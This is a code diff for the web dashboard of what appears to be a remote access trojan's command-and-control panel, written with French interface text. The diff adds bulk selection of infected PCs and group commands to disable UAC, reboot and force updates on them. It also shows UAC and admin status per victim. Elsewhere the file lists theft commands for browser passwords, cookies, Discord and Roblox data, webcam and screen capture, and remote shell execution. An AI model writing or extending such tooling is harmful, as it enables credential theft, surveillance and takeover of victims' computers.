@@ -12,7 +12,10 @@ let processSort = { field: null, asc: true };
 let currentDisplayedCommand = null;
 let isOnline = true;
 
-const REFRESH_TIMEOUT = 60; // 1 minute timeout for refresh polling
+// Sélection multiple
+let selectedClients = new Set();
+
+const REFRESH_TIMEOUT = 60;
 
 const commandDisplayNames = {
     ping: 'Ping', system_info: 'Systeme', discord_data: 'Discord',
@@ -21,28 +24,10 @@ const commandDisplayNames = {
     screenshot_webcam: 'Webcam', clipboard: 'Presse-papier',
     list_processes: 'Processus', file_explorer: 'Explorateur fichiers',
     execute_ps: 'PowerShell', execute_cmd: 'CMD',
-    download_file: 'Telechargement', upload_file: 'Upload'
+    download_file: 'Telechargement', upload_file: 'Upload',
+    disable_uac: 'Désactiver UAC', reboot: 'Redémarrer', force_update: 'Force Update'
 };
 
-// ========== FA ICONS FOR DISCORD INFO ==========
-const infoIcons = {
-    userId: '<span class="info-icon"><i class="fas fa-user"></i></span>',
-    email: '<span class="info-icon"><i class="fas fa-envelope"></i></span>',
-    phone: '<span class="info-icon"><i class="fas fa-phone"></i></span>',
-    friends: '<span class="info-icon"><i class="fas fa-users"></i></span>',
-    guilds: '<span class="info-icon"><i class="fas fa-server"></i></span>',
-    mfa: '<span class="info-icon"><i class="fas fa-lock"></i></span>',
-    flags: '<span class="info-icon"><i class="fas fa-flag"></i></span>',
-    locale: '<span class="info-icon"><i class="fas fa-globe"></i></span>',
-    verified: '<span class="info-icon"><i class="fas fa-check-circle"></i></span>',
-    nitro: '<span class="info-icon"><i class="fas fa-gem" style="color:#f0a24a;"></i></span>',
-    boost: '<span class="info-icon"><i class="fas fa-bolt" style="color:#e74c3c;"></i></span>',
-    payment: '<span class="info-icon"><i class="fas fa-credit-card"></i></span>',
-    token: '<span class="info-icon"><i class="fas fa-key"></i></span>',
-    admin: '<span class="info-icon"><i class="fas fa-shield-alt"></i></span>'
-};
-
-// Browser SVG logos
 const browserLogos = {
     'Chrome': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <circle cx="12" cy="12" r="4.5" fill="#fff"/>
@@ -85,7 +70,6 @@ const browserLogos = {
     </svg>`
 };
 
-// Payment method SVG logos
 const paymentLogos = {
     CreditCard: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg">
         <rect x="1" y="1" width="30" height="20" rx="3" fill="#1a1f3a" stroke="#3b82f6" stroke-width="1"/>
@@ -146,19 +130,113 @@ document.querySelectorAll('.nav-item').forEach(item => {
     });
 });
 
-function refreshAll() {
-    if (!isOnline) return;
+// ========== SELECTION & ACTIONS DE GROUPE ==========
+function toggleSelectAll() {
+    const allRows = document.querySelectorAll('.recent-client-row[data-machine-id]');
+    const allIds = Array.from(allRows).map(r => r.dataset.machineId);
+    if (selectedClients.size === allIds.length) {
+        // tout déselectionner
+        selectedClients.clear();
+        allRows.forEach(r => r.classList.remove('selected'));
+    } else {
+        // tout sélectionner
+        allIds.forEach(id => selectedClients.add(id));
+        allRows.forEach(r => r.classList.add('selected'));
+    }
+    updateSelectAllButton();
+}
+
+function toggleClientSelection(machineId, rowElement) {
+    if (selectedClients.has(machineId)) {
+        selectedClients.delete(machineId);
+        rowElement.classList.remove('selected');
+    } else {
+        selectedClients.add(machineId);
+        rowElement.classList.add('selected');
+    }
+    updateSelectAllButton();
+}
+
+function updateSelectAllButton() {
+    const allRows = document.querySelectorAll('.recent-client-row[data-machine-id]');
+    const btnText = document.getElementById('select-all-text');
+    if (selectedClients.size === allRows.length && allRows.length > 0) {
+        btnText.textContent = 'Tout désélectionner';
+    } else {
+        btnText.textContent = 'Sélectionner tout';
+    }
+}
+
+// Clic sur nom PC dans le dashboard
+document.addEventListener('click', function(e) {
+    const row = e.target.closest('.recent-client-row');
+    if (row && row.dataset.machineId) {
+        toggleClientSelection(row.dataset.machineId, row);
+    }
+});
+
+// Refresh des sélectionnés : relance une commande system_info pour chaque
+function refreshSelected() {
+    if (selectedClients.size === 0) {
+        showNotification('info', 'Aucun PC sélectionné');
+        return;
+    }
     const btn = document.getElementById('refresh-btn');
     const icon = btn.querySelector('i');
     icon.classList.add('refresh-spinning');
-
-    Promise.all([
-        loadStats(),
-        loadRecentClients(),
-        document.getElementById('clients-page').classList.contains('active') ? loadClients() : Promise.resolve()
-    ]).finally(() => {
-        icon.classList.remove('refresh-spinning');
+    let completed = 0;
+    const total = selectedClients.size;
+    selectedClients.forEach(id => {
+        sendCommandAndUpdate(id, 'system_info').finally(() => {
+            completed++;
+            if (completed >= total) {
+                icon.classList.remove('refresh-spinning');
+                showNotification('success', `${total} PC(s) actualisé(s)`);
+            }
+        });
     });
+}
+
+// Force Update pour les sélectionnés
+function forceUpdateSelected() {
+    if (selectedClients.size === 0) {
+        showNotification('info', 'Aucun PC sélectionné');
+        return;
+    }
+    selectedClients.forEach(id => {
+        sendCommandAndUpdate(id, 'force_update');
+    });
+    showNotification('info', `Force Update envoyée à ${selectedClients.size} PC(s)`);
+}
+
+// Désactiver UAC sur les sélectionnés
+function disableUacSelected() {
+    if (selectedClients.size === 0) {
+        showNotification('info', 'Aucun PC sélectionné');
+        return;
+    }
+    if (!confirm(`Voulez-vous vraiment tenter de désactiver l'UAC sur ${selectedClients.size} PC(s) ?`)) return;
+    selectedClients.forEach(id => {
+        sendCommandAndUpdate(id, 'disable_uac');
+    });
+    showNotification('info', `Commande disable_uac envoyée à ${selectedClients.size} PC(s)`);
+}
+
+async function sendCommandAndUpdate(machineId, cmdType, params = {}) {
+    try {
+        const res = await fetch('/api/send_command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ machine_id: machineId, command_type: cmdType, params: params })
+        });
+        const data = await res.json();
+        if (!data.command_id) throw new Error(data.error || 'Erreur');
+        // Optionnel : on pourrait attendre le résultat, mais ici on le lance simplement
+        return true;
+    } catch (e) {
+        showNotification('error', `Erreur pour ${machineId}: ${e.message}`);
+        return false;
+    }
 }
 
 // ========== STATS ==========
@@ -189,8 +267,10 @@ function renderRecentClients(clients) {
         container.innerHTML = '<div class="no-data">Aucun client connecte</div>';
         return;
     }
-    container.innerHTML = clients.map(client => `
-        <div class="recent-client-row">
+    container.innerHTML = clients.map(client => {
+        const checked = selectedClients.has(client.machine_id) ? 'selected' : '';
+        return `
+        <div class="recent-client-row ${checked}" data-machine-id="${client.machine_id}">
             <div class="recent-client-left">
                 <span class="recent-client-dot ${client.online ? 'online' : 'offline'}"></span>
                 <span class="recent-client-name">${escapeHtml(client.computer_name || client.machine_id)}</span>
@@ -200,8 +280,9 @@ function renderRecentClients(clients) {
                 <span class="recent-client-ip">${escapeHtml(client.ip || '?')}</span>
                 <span class="recent-client-time">${formatDate(client.last_seen)}</span>
             </div>
-        </div>
-    `).join('');
+        </div>`;
+    }).join('');
+    updateSelectAllButton();
 }
 
 // ========== CLIENTS ==========
@@ -233,7 +314,8 @@ function renderClients(clients) {
         const diskUsed = diskTotal - (client.disk_free || 0);
         const ramTotal = client.ram_total || 0;
         const ramUsed = ramTotal - (client.ram_available || 0);
-        const lastUpdate = client.last_update ? formatDate(client.last_update) : 'Inconnue';
+        const uacClass = client.uac_status === 'OFF' ? 'status-green' : 'status-orange';
+        const adminClass = client.admin_start === 'ON' ? 'status-green' : 'status-orange';
         return `
         <div class="client-card ${client.online ? 'online' : 'offline'}" ${client.online ? `onclick="openCommandModal('${client.machine_id}', '${escapeHtml(client.computer_name || client.machine_id)}')"` : ''}>
             <div class="client-header">
@@ -246,7 +328,9 @@ function renderClients(clients) {
                 <div class="client-detail-row"><i class="fas fa-globe"></i> ${escapeHtml(client.ip || '?')}</div>
                 <div class="client-detail-row"><i class="fas fa-hdd"></i> ${formatBytes(diskUsed)} / ${formatBytes(diskTotal)}</div>
                 <div class="client-detail-row"><i class="fas fa-memory"></i> ${formatBytes(ramUsed)} / ${formatBytes(ramTotal)}</div>
-                <div class="client-detail-row"><i class="fas fa-sync-alt"></i> Last Update: ${lastUpdate}</div>
+                <div class="client-detail-row"><i class="fas fa-shield-alt"></i> UAC: <span class="${uacClass}">${client.uac_status || '?'}</span></div>
+                <div class="client-detail-row"><i class="fas fa-crown"></i> Admin start: <span class="${adminClass}">${client.admin_start || '?'}</span></div>
+                <div class="client-detail-row"><i class="fas fa-sync-alt"></i> Last Update: ${client.last_update ? formatDate(client.last_update) : 'Inconnue'}</div>
                 <div class="client-detail-row"><i class="far fa-clock"></i> ${formatDate(client.last_seen)}</div>
             </div>
         </div>`;
@@ -524,14 +608,16 @@ function showResult(result, commandType, startTime) {
         roblox_cookie: 'fas fa-gamepad', browser_passwords: 'fas fa-key', browser_cookies: 'fas fa-cookie-bite',
         screenshot: 'fas fa-camera', screenshot_webcam: 'fas fa-video', clipboard: 'fas fa-copy',
         list_processes: 'fas fa-list', file_explorer: 'fas fa-folder-open', download_file: 'fas fa-download',
-        upload_file: 'fas fa-upload', execute_ps: 'fas fa-code', execute_cmd: 'fas fa-terminal'
+        upload_file: 'fas fa-upload', execute_ps: 'fas fa-code', execute_cmd: 'fas fa-terminal',
+        disable_uac: 'fas fa-shield-alt', reboot: 'fas fa-power-off', force_update: 'fas fa-download'
     };
     const titleIconColors = {
         ping: 'var(--green)', system_info: 'var(--accent)', discord_data: '#5865F2',
         roblox_cookie: 'var(--green)', browser_passwords: 'var(--amber)', browser_cookies: '#D2691E',
         screenshot: '#8b8fa5', screenshot_webcam: '#8b8fa5', clipboard: '#8b8fa5',
         list_processes: '#8b8fa5', file_explorer: 'var(--amber)', download_file: 'var(--amber)',
-        upload_file: 'var(--amber)', execute_ps: '#8b8fa5', execute_cmd: '#8b8fa5'
+        upload_file: 'var(--amber)', execute_ps: '#8b8fa5', execute_cmd: '#8b8fa5',
+        disable_uac: 'var(--red)', reboot: 'var(--red)', force_update: 'var(--accent)'
     };
 
     const iconClass = titleIcons[commandType] || 'fas fa-check-circle';
